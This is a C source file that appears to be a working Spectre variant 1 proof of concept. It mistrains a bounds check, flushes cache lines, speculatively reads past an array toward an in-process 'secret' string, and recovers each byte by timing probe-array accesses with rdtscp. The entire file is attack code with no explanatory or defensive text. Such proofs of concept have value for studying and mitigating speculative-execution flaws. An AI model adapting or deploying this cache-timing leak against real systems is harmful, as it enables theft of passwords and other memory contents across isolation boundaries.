#include <stdio.h>
#include <intrin.h>
#include <excpt.h>
#include <stdint.h>
#include <locale.h>
#include <Windows.h>
#include <stdlib.h>  

int special_attack = 0;
char* secret = "password!";
uint8_t known_data[10] = { 0,1,2,3,4,5,6,7,8,9 };
uint8_t legal_size = 10;

uint8_t probe_array[256][4096];
uint64_t access_time[256];

uint8_t visit_legal_char(size_t index)
{
    if (index < legal_size)
        return known_data[index];
    else
        return 0;
}

void special_visit_legal_char(size_t index)
{
    if (index < legal_size)
        probe_array[known_data[index]][0]++;
}

uint8_t Steal(size_t interst)
{
    for (size_t retries = 0; retries < 30000; retries++)
    {
        for (size_t i = 0; i < 256; i++)
        {
            _mm_clflush(&probe_array[i]);
            _mm_pause();
        }
        
        for (size_t i = 0; i < 10; i++)
        {
            _mm_clflush((const void*)(&legal_size));
            _mm_mfence();
            visit_legal_char(i);
            _mm_mfence();
        }

        if (special_attack)
        {
            _mm_clflush((const void*)(&legal_size));
            _mm_mfence();
            special_visit_legal_char(interst);
            _mm_mfence();
        }
        else
        {
            _mm_clflush((const void*)(&legal_size));
            _mm_mfence();
            uint8_t s = visit_legal_char(interst);
            probe_array[s][0]++;
            _mm_mfence();
        }
       
        for (size_t i = 0; i < 256; i++)
        {
            uint32_t aux = 0;
            uint64_t a = __rdtscp(&aux);
            probe_array[i][0]++;
            uint64_t b = __rdtscp(&aux);
            access_time[i] = b - a;
        }

        size_t idx_min = 0;
        for (size_t i = 0; i < 256; i++)
        {
            if (access_time[i] < access_time[idx_min]) idx_min = i;
            _mm_pause();
        }

        if (access_time[idx_min] < 100 && idx_min != 0 && 
            idx_min >= 32 && idx_min <= 126)//32 到 126是ASCII可打印字符
        {
            printf(" => %02X retries=%-5zd access_time=%llu\n"
                , (uint32_t)idx_min
                , retries
                , access_time[idx_min]
            );
            return (uint8_t)idx_min;
        }

        _mm_pause();
    }
  
    printf(" => 00\n");
    return 0;
}

int main(int argc, char* argv[])
{
    uint8_t buffer[10] = { 0 };
    size_t address_gap = secret - known_data;

    for (size_t i = 0; i < sizeof(buffer); i++)
    {
        printf("Steal#%-2zd", i);
        buffer[i] = Steal(i + address_gap);
    }

    for (size_t i = 0; i < sizeof(buffer); i++)
        putchar(buffer[i]);

    putchar('\n');

    return 0;
}